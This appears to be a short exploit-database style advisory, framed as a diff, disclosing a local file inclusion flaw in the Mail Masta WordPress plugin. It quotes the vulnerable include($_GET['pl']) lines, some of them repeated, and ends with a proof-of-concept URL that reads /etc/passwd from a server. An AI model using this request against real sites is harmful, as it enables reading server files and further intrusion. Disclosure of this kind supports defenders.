@@ -1,0 +1,31 @@
+[+] Date: [23-8-2016]
+[+] Autor Guillermo Garcia Marcos 
+[+] Vendor: https://downloads.wordpress.org/plugin/mail-masta.zip
+[+] Title: Mail Masta WP Local File Inclusion
+[+] info: Local File Inclusion 
+
+The File Inclusion vulnerability allows an attacker to include a file, usually exploiting a "dynamic file inclusion" mechanisms implemented in the target application. The vulnerability occurs due to the use of user-supplied input without proper validation.
+
+Source: /inc/campaign/count_of_send.php
+Line 4: include($_GET['pl']);
+
+Source: /inc/lists/csvexport.php:
+Line 5: include($_GET['pl']);
+
+Source: /inc/campaign/count_of_send.php
+Line 4: include($_GET['pl']);
+
+Source: /inc/lists/csvexport.php
+Line 5: include($_GET['pl']);
+
+Source: /inc/campaign/count_of_send.php
+Line 4: include($_GET['pl']);
+
+
+This looks as a perfect place to try for LFI. If an attacker is lucky enough, and instead of selecting the appropriate page from the array by its name, the script directly includes the input parameter, it is possible to include arbitrary files on the server.
+
+
+Typical proof-of-concept would be to load passwd file:
+
+
+http://server/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
